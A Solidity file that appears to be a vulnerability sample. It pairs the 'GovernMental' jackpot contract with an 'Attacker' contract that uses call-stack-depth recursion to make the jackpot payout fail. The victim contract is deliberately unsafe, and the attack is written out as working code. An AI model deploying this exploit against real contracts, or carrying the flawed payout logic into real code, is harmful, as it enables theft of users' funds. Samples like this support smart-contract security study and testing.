pragma solidity ^0.4.0;

contract Governmental {
    address public owner;
    address public lastInvestor;
    uint public jackpot = 1 ether;
    uint public lastInvestmentTimestamp;
    uint public ONE_MINUTE = 1 minutes;

    function Governmental() {
        owner = msg.sender;
        require(msg.value >= 1 ether);
    }

    function invest() {
        require(msg.value >= jackpot/2);
        lastInvestor = msg.sender;
        jackpot += msg.value/2;

        lastInvestmentTimestamp = block.timestamp;
    }

    function resetInvestment() {
        require(block.timestamp >= lastInvestmentTimestamp + ONE_MINUTE);

        if (lastInvestor != address(0)) {
            lastInvestor.transfer(jackpot);
        }
        owner.transfer(this.balance - 1 ether);

        lastInvestor = address(0);
        jackpot = 1 ether;
        lastInvestmentTimestamp = 0;
    }
}

contract Attacker {

    function attack(address target, uint count) {
        if (count < 1023) {
            this.attack.gas(msg.gas - 2000)(target, count + 1);
        } else {
            Governmental(target).resetInvestment();
        }
    }
}